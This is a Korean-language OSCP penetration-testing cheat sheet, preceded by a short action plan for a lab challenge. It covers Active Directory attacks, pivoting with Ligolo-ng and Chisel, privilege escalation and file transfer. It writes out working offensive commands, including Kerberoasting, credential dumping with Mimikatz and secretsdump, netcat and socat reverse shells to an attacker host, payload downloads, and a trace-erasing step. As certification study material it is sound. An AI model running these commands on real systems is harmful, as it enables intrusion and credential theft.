---
tags:
  - type/reference
  - platform/cheatsheet
  - tech/ad/kerberoast
  - tech/ad/asreproast
  - tech/ad/dcsync
  - tech/ad/acl-abuse
  - tech/ad/ntlm-relay
  - tech/ad/pth
  - tech/ad/bloodhound
  - tech/win/potato
  - tech/win/seimpersonate
  - tech/win/service-abuse
  - tech/win/alwaysinstall
  - tech/lin/suid
  - tech/lin/sudo-abuse
  - tech/lin/cron
  - tech/lin/nfs
  - tech/web/deserialization
  - tech/svc/smb
  - tech/svc/snmp
  - tech/exec/psexec
  - tech/exec/wmi
  - tech/cred/crack
  - tech/cred/mimikatz
  - tech/pivot/chisel
  - tech/pivot/ligolo
  - tech/pivot/ssh-tunnel
  - tech/pivot/socat
  - tech/enum/dirbust
  - tech/enum/peas
  - tech/payload/revshell
type: reference
platform: cheatsheet
tech_count: 29
---
### **Chall01 공략을 위한 정밀 행동 계획**

이제 새로운 환경입니다. 이전의 나쁜 습관은 버리고 아래의 **객관적 정찰 프로세스**를 따르십시오.

#### **1단계: 빈틈없는 정찰 (Enumeration)**

타겟 IP가 확인되는 즉시 다음 명령어를 실행하십시오. 어설픈 스캔은 정보의 사각지대를 만듭니다.

- **전 범위 포트 스캔:** `nmap -p- --min-rate 5000 [Target_IP]`
    
- **서비스 및 버전 상세 스캔:** 오픈된 포트를 대상으로 `-sV -sC -A` 실행.
    
- **비용 관리:** 스캔이 돌아가는 동안 수동으로 웹 페이지(80, 443, 8080 등)에 접속하여 배너와 타이틀을 확인하십시오.
    

#### **2단계: 서비스별 우선순위 설정**

스캔 결과가 나오면 무작정 찌르지 말고 **공격 표면(Attack Surface)**을 분석하십시오.

- **웹 서비스(HTTP/HTTPS):** CMS 버전, 알려진 취약점(CVE), 관리자 페이지 노출 여부.
    
- **파일 공유(SMB/NFS):** 익명 로그인이 가능한 공유 폴더 수색.
    
- **데이터베이스(MySQL/MSSQL):** 기본 계정(`root`, `sa`) 및 약한 암호 테스트.
    

#### **3단계: 초기 침투 (Initial Access)**

공격 벡터를 정했다면 **가장 단순한 것**부터 시도하십시오.

- 기본 자격 증명(admin/admin) -> 알려진 익스플로잇(Public Exploit) -> 무차별 대입(Brute Force) 순입니다.
    
- **주의:** Chall0에서처럼 Java 역직렬화나 복잡한 RCE가 필요하다면, 페이로드 생성 시 **환경 제약**을 미리 고려하십시오.

# 고급 공격 보안 필드 매뉴얼: OSCP 인증 및 실무를 위한 심층 분석 (2025/2026 에디션)

## 1. 서론: 현대적 공격 보안 작전의 진화

모의 해킹과 공격 보안(Offensive Security)의 영역, 특히 OSCP(Offensive Security Certified Professional) 인증이 요구하는 기술적 수준은 단순한 스크립트 실행을 넘어선 포괄적인 전술적 이해를 요구하고 있습니다. 과거의 단일 익스플로잇 중심 접근 방식은 이제 복잡하게 상호 연결된 Active Directory(AD) 환경, 다중 서브넷 피보팅(Pivoting), 그리고 정교한 권한 상승(Privilege Escalation) 기법으로 진화하였습니다. 본 보고서는 이러한 변화에 발맞추어, 최신 연구 자료와 현장 데이터를 기반으로 공격자가 숙지해야 할 전술, 기법 및 절차(TTPs)를 심층적으로 분석합니다.

이 문서는 단순한 명령어 모음집(Cheat Sheet)의 기능을 넘어, 각 명령어가 수행되는 운영체제 내부의 메커니즘을 설명하고, 왜 특정 공격 벡터가 유효한지, 그리고 실패 시 어떻게 트러블슈팅을 해야 하는지에 대한 전문적인 통찰을 제공하는 것을 목표로 합니다. 특히 2025년 최신 트렌드를 반영하여 Ligolo-ng를 이용한 터널링, Impacket을 활용한 AD 공격, 그리고 수동(Manual) 권한 상승 기법에 중점을 둡니다.

본 보고서의 분석은 철저히 제공된 연구 자료와 최신 보안 동향에 기반하며, 독자가 실무 환경이나 OSCP 시험과 같은 통제된 환경에서 즉시 활용할 수 있는 수준의 구체성을 담고 있습니다. 모든 기술적 주장은 신뢰할 수 있는 소스에 근거하여 서술됩니다.

---

## 2. 인프라 구축 및 도구 최적화 (Infrastructure & Tooling)

성공적인 침투 테스트는 안정적이고 최적화된 공격 환경에서 시작됩니다. 칼리 리눅스(Kali Linux)와 같은 배포판이 기본적으로 제공하는 도구 외에도, 특정 시나리오에 특화된 도구의 설정과 버전 관리가 필수적입니다.

### 2.1 필수 도구의 현대화 및 구성

현대적인 모의 해킹 환경에서는 도구의 버전 호환성이 공격 성공 여부를 가릅니다. 특히 Active Directory 및 터널링 도구는 빈번하게 업데이트되므로 최신 상태 유지가 중요합니다.

#### 2.1.1 NetExec (구 CrackMapExec)

과거 CrackMapExec으로 알려졌던 NetExec은 AD 환경에서의 정찰과 측면 이동(Lateral Movement)을 위한 핵심 도구입니다. SMB, WinRM, LDAP, SSH 등 다양한 프로토콜을 지원하며, 이를 통해 도메인 내의 자격 증명 유효성을 검증하거나 스프레이(Spray) 공격을 수행할 수 있습니다.1

NetExec의 강력함은 모듈성에 있습니다. 단순한 연결 확인을 넘어, `lsass` 덤프나 토큰 조작과 같은 고급 기능을 수행할 수 있으나, OPSEC(작전 보안) 관점에서는 탐지될 확률이 높으므로 초기 정찰 단계에서는 신중하게 사용해야 합니다.

#### 2.1.2 Impacket 라이브러리

Impacket은 네트워크 프로토콜을 저수준에서 다룰 수 있게 해주는 Python 클래스 모음으로, AD 공격의 근간을 이룹니다. `psexec.py`, `wmiexec.py`, `GetNPUsers.py` 등은 윈도우 인증 메커니즘인 NTLM과 Kerberos를 직접 조작할 수 있게 해줍니다.3 연구 자료에 따르면, Impacket은 도커(Docker)나 Python 가상 환경(venv)을 통해 관리하는 것이 권장되는데, 이는 도구 간의 의존성 충돌을 방지하기 위함입니다.3

#### 2.1.3 Ligolo-ng

터널링의 패러다임이 SOCKS 프록시에서 TUN 인터페이스 기반의 VPN 형태로 전환되고 있습니다. Ligolo-ng는 Chisel보다 빠르고 안정적이며, ICMP와 같은 비 TCP 트래픽도 터널링할 수 있는 장점을 가집니다.5 이는 공격자가 내부 네트워크를 마치 로컬 네트워크처럼 다룰 수 있게 해주며, `nmap`의 SYN 스캔(`-sS`)과 같은 기능을 제한 없이 사용할 수 있게 합니다.

### 2.2 쉘 환경 최적화 전략

터미널 환경의 효율성은 공격 속도와 직결됩니다. 긴 명령어를 반복적으로 입력하는 것은 실수를 유발하고 시간을 낭비하게 합니다.

- **Alias 설정:** 자주 사용하는 긴 명령어는 별칭(Alias)으로 등록해야 합니다. 예를 들어, `python3 -m http.server 80`과 같은 명령어는 `www`로 단축하여 웹 서버를 즉시 구동할 수 있게 설정합니다.7
    
- **Rlwrap 활용:** Netcat(`nc`) 리스너를 사용할 때 `rlwrap`을 적용하면, 쉘 히스토리 기능과 커서 이동이 가능해져 작업 효율이 극대화됩니다. 이는 단순한 편의 기능을 넘어, 쉘 안정화 이전 단계에서의 실수로 인한 세션 종료를 방지하는 중요한 전술입니다.8
    

---

## 3. 심층 정찰 및 열거 (Advanced Reconnaissance & Enumeration)

정찰(Enumeration)은 공격의 첫 단계이자 가장 중요한 단계입니다. 시스템의 결함을 찾기 위해서는 대상 시스템이 무엇인지, 어떤 서비스가 구동 중인지, 그리고 그 서비스들이 어떻게 구성되어 있는지를 완벽하게 파악해야 합니다. 연구 자료는 "철저한 열거 없이 익스플로잇을 시도하지 말라"고 강조합니다.9

### 3.1 Nmap을 활용한 다층적 스캔 전략

Nmap은 강력하지만, 무분별한 사용은 네트워크 대역폭을 포화시키거나 탐지될 위험을 높입니다. 따라서 단계별 접근 방식이 필요합니다.

#### 3.1.1 초기 발견과 전체 포트 스캔

가장 먼저 수행해야 할 작업은 대상 호스트의 살아있는 포트를 식별하는 것입니다. 시간을 절약하면서도 누락을 방지하기 위해 2단계 스캔 전략을 사용합니다.

1. **고속 TCP 스캔:** 모든 포트(1-65535)를 대상으로 서비스 버전 탐지 없이 개방 여부만 확인합니다.
    
    - `nmap -p- --min-rate 1000 -T4 -v <TargetIP>` 11
        
    - _분석:_ `--min-rate 1000` 옵션은 Nmap이 초당 최소 1000개의 패킷을 보내도록 강제합니다. 이는 OSCP 랩과 같은 안정적인 네트워크 환경에서 스캔 시간을 획기적으로 단축시킵니다. `-v` 옵션은 발견된 포트를 실시간으로 출력하여 공격자가 즉시 후속 작업을 계획할 수 있게 합니다.
        
2. **심층 서비스 스캔:** 1단계에서 발견된 포트만을 대상으로 스크립트(`-sC`)와 버전 탐지(`-sV`)를 수행합니다.
    
    - `nmap -p <OpenPorts> -sC -sV -oN full_scan.txt <TargetIP>` 11
        
    - _분석:_ `-sC`는 기본 NSE(Nmap Scripting Engine) 스크립트를 실행하여 FTP 익명 로그인 허용 여부, SSH 호스트 키, HTTP 타이틀 정보 등을 자동으로 수집합니다. 결과는 반드시 `-oN` 옵션을 통해 파일로 저장하여 추후 분석에 활용해야 합니다.
        
3. **UDP 스캔:** TCP에 비해 느리고 신뢰성이 떨어지지만, SNMP(161), TFTP(69)와 같은 중요한 서비스는 UDP를 사용합니다.
    
    - `sudo nmap -sU --top-ports 100 <TargetIP>` 12
        
    - _분석:_ 전체 UDP 포트를 스캔하는 것은 시간이 너무 많이 소요되므로, 상위 100개 또는 200개의 포트만 선별적으로 스캔하는 것이 효율적입니다.
        

### 3.2 서비스별 정밀 열거 기법

포트가 발견되면 해당 서비스에 특화된 열거를 수행해야 합니다.

#### 3.2.1 SMB (Server Message Block) - 139/445

SMB는 윈도우 환경에서 가장 흔한 공격 벡터 중 하나입니다. 공유 폴더에 대한 접근 권한, SMB 버전, 그리고 서명(Signing) 설정 여부를 확인해야 합니다.

- **공유 목록 확인:** `smbclient -L //<TargetIP> -N` 명령어를 통해 익명(Null Session) 로그인이 가능한지 확인합니다.11 익명 로그인이 가능하다면 민감한 데이터가 포함된 백업 파일이나 설정 파일을 찾을 수 있습니다.
    
- **재귀적 파일 목록:** `smbmap -H <TargetIP> -R` 명령어를 사용하여 접근 가능한 모든 공유 폴더의 파일 목록을 재귀적으로 확인합니다.13
    
- **취약점 스캔:** `nmap --script smb-vuln* -p 139,445 <TargetIP>`를 통해 MS17-010(EternalBlue)과 같은 치명적인 취약점 존재 여부를 파악할 수 있습니다.11
    

#### 3.2.2 SNMP (Simple Network Management Protocol) - 161

SNMP가 `public` 커뮤니티 문자열로 설정되어 있다면, 시스템 내부 정보를 획득할 수 있는 강력한 통로가 됩니다.

- **데이터 추출:** `snmpwalk -v2c -c public <TargetIP>` 명령어를 기본으로 사용합니다.11
    
- **정보 가공:** `snmp-check <TargetIP>` 도구는 추출된 데이터를 사용자 계정, 실행 중인 프로세스, 설치된 소프트웨어, 네트워크 정보 등으로 분류하여 가독성 높은 리포트를 제공합니다. 이는 윈도우 시스템에서 로컬 사용자 목록을 확보하는 데 매우 유용합니다.
    

#### 3.2.3 웹 애플리케이션 (HTTP/HTTPS) - 80/443

웹은 가장 가변적이고 방대한 공격 표면입니다. 단순히 브라우저로 접속하는 것을 넘어 숨겨진 디렉토리와 가상 호스트를 찾아야 합니다.

- **디렉토리 브루트포스:** `gobuster` 또는 `ffuf`를 사용하여 숨겨진 경로를 찾습니다.
    
    - `gobuster dir -u <URL> -w <Wordlist> -x php,txt,html,sh,cgi` 11
        
    - _분석:_ `-x` 옵션을 사용하여 확장자를 지정하는 것이 중요합니다. 리눅스 서버라면 `.sh`, `.pl` 등을, 윈도우라면 `.asp`, `.aspx`를 추가하여 백업 파일이나 스크립트를 찾아낼 확률을 높여야 합니다.
        
- **가상 호스트 퍼징:** 서버가 IP로 접속했을 때와 도메인으로 접속했을 때 다른 콘텐츠를 보여주는 경우가 많습니다. `Host` 헤더를 조작하여 서브도메인을 찾아야 합니다.
    
    - `ffuf -w <Wordlist> -u http://<TargetIP> -H "Host: FUZZ.<Domain>"` 12
        
- **CMS 식별 및 취약점 스캔:** WordPress(`wpscan`), Drupal(`droopescan`), Joomla 등 CMS가 식별되면 전용 스캐너를 사용하여 알려진 플러그인 취약점을 탐색해야 합니다.13
    

---

## 4. Active Directory: 공격의 핵심과 인증 체계의 허점

2025년 OSCP 환경에서 Active Directory(AD)에 대한 이해는 선택이 아닌 필수입니다. AD는 사용자, 컴퓨터, 서비스, 정책을 중앙에서 관리하는 데이터베이스이자 인증 시스템입니다. 공격자는 이 신뢰 구조를 악용하여 권한을 획득합니다.

### 4.1 초기 AD 열거 및 시각화

도메인에 진입한 직후(Initial Foothold), 또는 내부 네트워크에 접근한 경우 가장 먼저 수행해야 할 작업은 도메인 구조를 매핑하는 것입니다.

#### 4.1.1 BloodHound를 이용한 공격 경로 시각화

BloodHound는 그래프 이론을 사용하여 AD 내의 숨겨진 관계를 시각화합니다. 이는 공격자가 "도메인 관리자(Domain Admin)"로 가는 최단 경로를 찾는 데 결정적인 역할을 합니다.14

1. **데이터 수집 (Collection):** 침해한 윈도우 호스트에서 `SharpHound.exe -c All`을 실행하거나, 리눅스 기반에서 `python-bloodhound`를 사용하여 데이터를 수집합니다.15
    
2. **분석 (Analysis):** 수집된 데이터를 BloodHound GUI에 로드하여 분석합니다. "AS-REP Roastable Users", "Kerberoastable Users"와 같은 사전 정의된 쿼리를 사용하여 취약한 계정을 식별합니다. 또한, 그룹 위임(Delegation) 권한이나 ACL(Access Control List) 미설정을 통해 횡적으로 이동할 수 있는 경로를 파악합니다.
    

#### 4.1.2 PowerView 및 기본 도구 활용

PowerShell 기반의 PowerView는 "Living off the Land" 전략의 핵심입니다. 별도의 바이너리 설치 없이 메모리 상에서 스크립트를 실행하여 탐지 가능성을 낮출 수 있습니다.

- **도메인 정보:** `Get-NetDomain`, `Get-NetUser`, `Get-NetComputer` 명령어로 기본 정보를 수집합니다.15
    
- **관리자 권한 식별:** `Find-LocalAdminAccess`는 현재 사용자가 관리자 권한을 가진 네트워크 상의 다른 컴퓨터를 찾아줍니다. 이는 측면 이동(Lateral Movement)의 즉각적인 목표를 제시합니다.
    

### 4.2 Kerberos 프로토콜 취약점 공격

Kerberos는 AD의 기본 인증 프로토콜이지만, 설계상의 특징으로 인해 오프라인 크랙 공격에 취약합니다.

#### 4.2.1 AS-REP Roasting

이 공격은 "Kerberos 사전 인증이 필요 없음(Do not require Kerberos preauthentication)" 옵션이 설정된 계정을 대상으로 합니다. 공격자는 해당 계정의 비밀번호를 몰라도 KDC(Key Distribution Center)에 TGT(Ticket Granting Ticket)를 요청할 수 있으며, 응답으로 오는 암호화된 메시지(AS-REP)를 획득하여 오프라인에서 비밀번호를 크랙할 수 있습니다.3

- **실행 (Impacket):**
    
    - `impacket-GetNPUsers <Domain>/ -usersfile <UserList> -format hashcat -outputfile hashes.txt` 4
        
- **크랙:**
    
    - `hashcat -m 18200 hashes.txt rockyou.txt` 4
        
- _통찰:_ 이 공격은 유효한 자격 증명 없이도 사용자 목록만 있다면 시도해 볼 수 있는 고효율 공격입니다.
    

#### 4.2.2 Kerberoasting

Kerberoasting은 SPN(Service Principal Name)이 설정된 서비스 계정을 목표로 합니다. 공격자는 유효한 도메인 사용자 권한으로 서비스 이용을 위한 티켓(TGS)을 요청합니다. 이 TGS는 서비스 계정의 NTLM 해시로 암호화되어 있어, 이를 추출하여 오프라인에서 크랙할 수 있습니다.17

- **실행 (Impacket):**
    
    - `impacket-GetUserSPNs <Domain>/<User>:<Password> -request` 3
        
- **크랙:**
    
    - `hashcat -m 13100 hashes.txt rockyou.txt` 17
        
- _통찰:_ 서비스 계정은 종종 강력한 권한(예: 도메인 관리자)을 가지면서도 비밀번호 변경 주기가 길거나 단순한 비밀번호를 사용하는 경향이 있어 매우 중요한 공격 벡터입니다.
    

### 4.3 측면 이동(Lateral Movement) 및 자격 증명 탈취

도메인 장악을 위해서는 단일 호스트를 넘어 네트워크 전체로 영향력을 확대해야 합니다.

#### 4.3.1 Pass-the-Hash (PtH)

비밀번호 원문(Plaintext)을 몰라도 NTLM 해시만 있으면 인증이 가능합니다. NTLM 프로토콜은 해시 값을 이용해 챌린지-응답(Challenge-Response) 방식으로 인증하기 때문입니다.

- **실행:** `impacket-psexec <User>@<TargetIP> -hashes <LM:NTLM>`.3
    
- **적용:** 덤프한 해시를 이용하여 다른 머신으로 이동하거나, 로컬 관리자 패스워드 재사용(Password Reuse)을 노려 네트워크 전체를 장악할 수 있습니다.
    

#### 4.3.2 자격 증명 덤프 (Credential Dumping)

시스템 권한을 획득하면 메모리나 디스크에 저장된 자격 증명을 추출해야 합니다.

- **Mimikatz:** 윈도우 보안의 핵심인 LSASS(Local Security Authority Subsystem Service) 프로세스의 메모리를 읽어 평문 비밀번호나 해시를 추출합니다.
    
    - `privilege::debug` -> `sekurlsa::logonpasswords`.18
        
- **Secretsdump:** 레지스트리(SAM, SYSTEM, SECURITY) 하이브를 읽어 로컬 계정 해시, 캐시된 도메인 자격 증명(DCC2), LSA 시크릿 등을 추출합니다.
    
    - `impacket-secretsdump <User>:<Pass>@<TargetIP>`.4
        
    - _통찰:_ 원격으로 `secretsdump`를 실행하면 파일 업로드 없이도 도메인 컨트롤러의 `NTDS.dit` 파일을 덤프하여 모든 도메인 사용자의 해시를 획득할 수 있습니다(DCSync 공격).
        

---

## 5. 네트워크 피보팅 및 터널링 (Pivoting & Tunneling)

실제 기업망이나 OSCP 랩 환경은 여러 개의 서브넷으로 분리되어 있습니다. 공격자가 직접 접근할 수 없는 내부망(Internal Network)에 도달하기 위해서는 이미 장악한 시스템을 교두보(Pivot)로 삼아 트래픽을 중계해야 합니다.

### 5.1 Ligolo-ng: 차세대 터널링 표준

전통적인 Chisel이나 Proxychains는 SOCKS 프로토콜을 기반으로 하여 TCP 연결은 지원하지만, ICMP(Ping)나 SYN 스캔과 같은 하위 계층 프로토콜을 지원하지 못하는 한계가 있었습니다. Ligolo-ng는 사용자 공간에 가상의 네트워크 인터페이스(TUN)를 생성하여 완벽한 VPN과 같은 환경을 제공합니다.5

#### 5.1.1 인터페이스 설정 (공격자 측)

1. **TUN 인터페이스 생성:**
    
    - `sudo ip tuntap add user <Username> mode tun ligolo`
        
    - `sudo ip link set ligolo up`
        
2. **프록시 서버 실행:**
    
    - `./proxy -selfcert -laddr 0.0.0.0:443`.5
        
    - _통찰:_ 443 포트를 사용하는 이유는 대부분의 방화벽이 HTTPS 트래픽을 허용하기 때문입니다.
        

#### 5.1.2 에이전트 연결 (피해자 측)

1. **에이전트 전송:** 대상 운영체제에 맞는 `agent` 바이너리를 업로드합니다.
    
2. **역방향 연결:**
    
    - `./agent -connect <AttackerIP>:443 -ignore-cert`.5
        

#### 5.1.3 라우팅 설정 및 터널 활성화

프록시 서버에 에이전트가 연결되면, 공격자 머신에서 해당 내부 대역으로 가는 경로를 지정해야 합니다.

1. **세션 선택:** Ligolo 콘솔에서 `session` 명령어로 연결된 에이전트를 선택하고 `start`를 입력하여 터널을 엽니다.
    
2. **라우팅 추가:** 공격자 칼리 머신에서 `ip route` 명령어로 트래픽을 Ligolo 인터페이스로 보냅니다.
    
    - `sudo ip route add <InternalSubnet>/24 dev ligolo`.5
        
    - _결과:_ 이제 공격자는 `proxychains` 접두사 없이도 `nmap`, `rdesktop`, 브라우저 등을 사용하여 내부망 자원에 직접 접근할 수 있습니다.
        

### 5.2 Chisel: SOCKS 기반의 대안

Ligolo-ng를 사용할 수 없는 환경에서는 Chisel이 강력한 대안이 됩니다. HTTP 터널링을 통해 방화벽을 우회하며 SOCKS5 프록시를 생성합니다.

- **서버 (공격자):** `chisel server -p 8000 --reverse`
    
- **클라이언트 (피해자):** `chisel client <AttackerIP>:8000 R:socks`
    
- **설정:** `/etc/proxychains.conf` 파일의 마지막 줄에 `socks5 127.0.0.1 1080`을 추가합니다.
    
- _제약 사항:_ Proxychains를 통한 Nmap 스캔 시에는 반드시 `-sT`(Connect Scan) 옵션을 사용해야 하며, 속도가 느리고 ICMP 패킷 전송이 불가능함을 인지해야 합니다.21
    

---

## 6. 윈도우 권한 상승 (Windows Privilege Escalation)

낮은 권한의 쉘을 획득했다면, 시스템 전체를 제어하기 위해 `SYSTEM` 권한으로 상승해야 합니다. 이는 주로 잘못된 설정(Misconfiguration)이나 커널 취약점을 통해 이루어집니다.

### 6.1 자동화된 열거 및 분석

수동으로 모든 설정을 확인하는 것은 비효율적입니다. **WinPEAS**와 같은 도구는 시스템의 방대한 정보를 빠르게 스캔하여 잠재적인 취약점을 색상별로 강조해 줍니다.

- **실행:** `winPEASx64.exe`.22
    
- **분석 포인트:** 붉은색으로 표시된 항목에 주목해야 합니다. 특히 "Unquoted Service Paths", "Modifiable Service Binaries", "AlwaysInstallElevated" 레지스트리 키 등이 주요 타겟입니다.
    

### 6.2 서비스 악용 (Service Abuse) 전략

윈도우 서비스는 주로 `SYSTEM` 권한으로 실행됩니다. 사용자가 서비스의 설정이나 실행 파일을 변경할 수 있다면, 서비스가 시작될 때 악성 코드를 `SYSTEM` 권한으로 실행시킬 수 있습니다.

#### 6.2.1 인용되지 않은 서비스 경로 (Unquoted Service Paths)

서비스 경로에 공백이 포함되어 있고 따옴표로 감싸져 있지 않다면(예: `C:\Program Files\My Service\service.exe`), 윈도우는 실행 파일을 찾을 때 공백을 구분자로 인식하여 순차적으로 탐색합니다.

1. `C:\Program.exe`
    
2. `C:\Program Files\My.exe`
    
3. `C:\Program Files\My Service\service.exe`
    

- **탐지:** `wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """`.11
    
- **공격:** 쓰기 권한이 있는 경로(예: `C:\`)에 악성 바이너리를 `Program.exe`라는 이름으로 배치하고 서비스를 재시작하면 권한 상승이 발생합니다.
    

#### 6.2.2 취약한 서비스 권한

사용자가 서비스 객체에 대해 `SERVICE_CHANGE_CONFIG`나 `GenericWrite` 권한을 가진 경우, 서비스가 실행하는 바이너리 경로(`binpath`)를 변경할 수 있습니다.

- **권한 확인:** `accesschk.exe -ucqv <ServiceName>`.18
    
- **익스플로잇:**
    
    1. 서비스 경로 변경: `sc config <ServiceName> binpath= "C:\Temp\nc.exe <AttackerIP> 4444 -e cmd.exe"`
        
    2. 서비스 재시작: `net stop <ServiceName>` 후 `net start <ServiceName>`.
        
    
    - _결과:_ 서비스가 시작되면서 넷캣(Netcat)이 `SYSTEM` 권한으로 역방향 쉘을 연결합니다.
        

### 6.3 커널 익스플로잇 및 특권 토큰

- **SeImpersonatePrivilege (Potato 공격):** `whoami /priv` 명령 결과 `SeImpersonatePrivilege`가 활성화되어 있다면(주로 IIS나 MSSQL 서비스 계정), **PrintSpoofer**, **GodPotato**, **JuicyPotato** 도구를 사용하여 즉시 `SYSTEM` 권한을 획득할 수 있습니다.16 이 공격은 윈도우의 명명된 파이프(Named Pipe) 메커니즘을 악용하여 `SYSTEM` 토큰을 탈취합니다.
    
    - _명령:_ `PrintSpoofer.exe -i -c cmd`
        

---

## 7. 리눅스 권한 상승 (Linux Privilege Escalation)

리눅스 권한 상승은 주로 관리자의 편의를 위해 설정된 과도한 권한이나, 소홀한 파일 권한 관리에서 기인합니다.

### 7.1 Sudo 권한 오용 (Sudo Rights Abuse)

가장 흔하고 확실한 벡터입니다. `root` 권한으로 비밀번호 없이 실행할 수 있는 명령어가 있는지 확인합니다.

- **확인:** `sudo -l`.24
    
- **GTFOBins 활용:** `vim`, `find`, `awk`, `less`와 같은 유틸리티가 sudo 권한으로 실행 가능하다면, 이를 통해 쉘을 이스케이프(Escape)하여 루트 쉘을 얻을 수 있습니다.
    
    - _예시 (Find):_ `sudo find. -exec /bin/sh \; -quit` 명령은 `find`가 파일을 찾는 동안 `/bin/sh`를 루트 권한으로 실행하게 만듭니다.26
        

### 7.2 SUID/SGID 바이너리

SUID 비트가 설정된 파일은 실행 시 파일 소유자(주로 root)의 권한으로 실행됩니다.

- **탐지:** `find / -perm -4000 2>/dev/null`.11
    
- **분석:** `/usr/bin/passwd`와 같은 표준 SUID 파일 외에, `/opt`나 `/usr/local/bin` 등에 위치한 비표준 바이너리를 주목해야 합니다. `strings` 명령어로 내부 문자열을 확인하거나 `ltrace`로 라이브러리 호출을 추적하여, 절대 경로 없이 `cat`이나 `service` 등을 호출하는 취약점을 찾아 PATH 변수 조작 공격을 수행할 수 있습니다.
    

### 7.3 Cron 작업 및 파일 권한

- **Cron 작업:** `/etc/crontab`이나 `/etc/cron.d/` 디렉토리 내의 스크립트가 주기적으로 루트 권한으로 실행되는지 확인합니다.
    
- **쓰기 권한:** 만약 해당 스크립트 파일에 일반 사용자가 쓰기 권한을 가지고 있다면, 파일 내용을 역방향 쉘 코드로 덮어씌워 루트 권한을 획득할 수 있습니다.
    
- **Pspy:** 정적 파일 분석으로 보이지 않는 작업은 `pspy64`를 사용하여 실시간 프로세스 모니터링을 통해 탐지할 수 있습니다. 이는 시스템 내부에서 주기적으로 실행되는 숨겨진 스크립트를 찾는 데 매우 효과적입니다.16
    

### 7.4 NFS Root Squashing 취약점

NFS 공유 설정에서 `no_root_squash` 옵션이 활성화되어 있다면, 클라이언트(공격자) 측에서 루트 권한으로 생성한 파일이 서버(피해자) 측에서도 루트 소유로 유지됩니다. 공격자는 공유 폴더에 SUID가 설정된 쉘 바이너리를 생성하고, 피해자 시스템에서 이를 실행하여 루트 권한을 얻을 수 있습니다.11

---

## 8. 파일 전송 방법론 (File Transfer Methodologies)

공격 도구(Ingress)를 대상 시스템으로 옮기거나, 탈취한 데이터(Exgress)를 유출하기 위해서는 다양한 프로토콜을 활용할 수 있어야 합니다. 방화벽이 특정 포트를 차단할 수 있기 때문입니다.

### 8.1 윈도우 환경 파일 전송

윈도우는 강력한 내장 도구를 제공하므로 외부 바이너리 없이도 파일 다운로드가 가능합니다.

- **Certutil:** 본래 인증서 관리를 위한 도구이나, URL 캐시 기능을 이용해 파일을 다운로드할 수 있습니다.
    
    - `certutil.exe -urlcache -split -f http://<AttackerIP>/file.exe C:\Temp\file.exe`.29
        
    - _주의:_ 사용 후 `certutil.exe -urlcache -split -f delete` 명령어로 캐시를 삭제하여 흔적을 지워야 합니다.
        
- **PowerShell (IWR):** 최신 윈도우에서 가장 직관적인 방법입니다.
    
    - `Invoke-WebRequest -Uri http://<AttackerIP>/file.exe -OutFile file.exe`.11
        
- **PowerShell (WebClient):** IWR을 사용할 수 없는 구형 PowerShell 환경에서 유용합니다.
    
    - `(New-Object Net.WebClient).DownloadFile('http://<AttackerIP>/file.exe', 'file.exe')`.30
        
- **SMB:** HTTP가 차단된 경우 유용합니다. 칼리에서 SMB 서버를 열고 윈도우의 `copy` 명령어를 사용합니다.
    
    - 공격자: `impacket-smbserver share.`
        
    - 피해자: `copy \\<AttackerIP>\share\file.exe.`.7
        

### 8.2 리눅스 환경 파일 전송

- **Wget:** `wget http://<AttackerIP>/file`.29
    
- **Curl:** `curl http://<AttackerIP>/file -o file`.29
    
- **Netcat:** 파일 전송에도 활용 가능합니다.
    
    - 받는 쪽: `nc -l -p 1234 > file`
        
    - 보내는 쪽: `nc <ReceiverIP> 1234 < file`.7
        
- **SCP:** SSH 자격 증명을 알고 있다면 가장 안전하고 확실한 방법입니다.
    
    - `scp user@<TargetIP>:/path/to/file.`.30
        

---

## 9. 쉘 안정화 및 작전 보안 (Shell Stabilization & OPSEC)

초기 침투를 통해 얻은 "Dumb Shell"(예: 단순 Netcat 연결)은 매우 불안정합니다. `Ctrl+C`를 누르면 쉘이 죽어버리고, `sudo`와 같은 대화형 명령어를 실행할 수 없으며, 탭 자동 완성이 되지 않습니다. 이를 완전한 대화형 TTY(Teletype) 쉘로 업그레이드하는 것은 필수적입니다.

### 9.1 Python PTY 기법

가장 범용적으로 사용되는 안정화 방법입니다.

1. **쉘 스폰:** `python3 -c 'import pty; pty.spawn("/bin/bash")'`.11
    
2. **백그라운드 전환:** `Ctrl+Z`를 눌러 쉘을 일시 중단합니다.
    
3. **터미널 설정:** 칼리 터미널에서 `stty raw -echo; fg`를 입력합니다. 이는 로컬 터미널의 입력을 원격으로 그대로 전달하게 하며, 에코(입력한 글자가 화면에 찍히는 것)를 제어합니다.
    
4. **초기화:** 쉘로 돌아오면 `reset`을 입력하고, `xterm` 터미널 타입을 설정합니다.
    
    - `export TERM=xterm`
        
    - `export SHELL=bash`
        
    - _결과:_ 탭 완성, 화살표 키, `Ctrl+C` 시그널 처리가 완벽하게 작동하는 쉘을 얻게 됩니다.
        

### 9.2 Socat TTY 기법

Socat은 Netcat보다 강력한 기능을 제공하며, 완벽한 TTY 세션을 맺을 수 있습니다. 대상 시스템에 `socat` 바이너리가 필요하다는 단점이 있지만, 정적으로 컴파일된 바이너리를 업로드하여 해결할 수 있습니다.

- **리스너 (공격자):** `socat file:`tty`,raw,echo=0 tcp-listen:4444`.31
    
- **클라이언트 (피해자):** `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<AttackerIP>:4444`.
    
- _통찰:_ Socat 쉘은 SSH 연결과 거의 구분할 수 없을 정도로 안정적이며, `top`이나 `vim`과 같은 풀 스크린 애플리케이션도 문제없이 실행됩니다.
    

---

## 10. 결론 및 종합 분석

OSCP와 같은 실전형 모의 해킹에서 성공은 단순히 얼마나 많은 도구를 아느냐가 아니라, 올바른 **방법론(Methodology)**을 얼마나 집요하게 적용하느냐에 달려 있습니다. 2025/2026년의 보안 환경은 "스캔 후 익스플로잇"이라는 단순한 공식에서 벗어나 "열거하고, 매핑하고, 피보팅하라"는 심층적인 접근을 요구합니다.

**핵심 요약 및 제언:**

1. **열거는 재귀적이다:** 새로운 자격 증명이나 서비스를 발견할 때마다, 이미 탐색했던 자산에 대해 다시 열거를 수행해야 합니다. 새로운 키는 닫혀있던 문을 열 수 있습니다.
    
2. **도구 의존성을 줄여라:** 외부 바이너리 반입을 최소화하고, PowerShell이나 Bash와 같은 내장 기능(Living off the Land)을 활용하는 것이 탐지 우회와 안정성 측면에서 유리합니다.
    
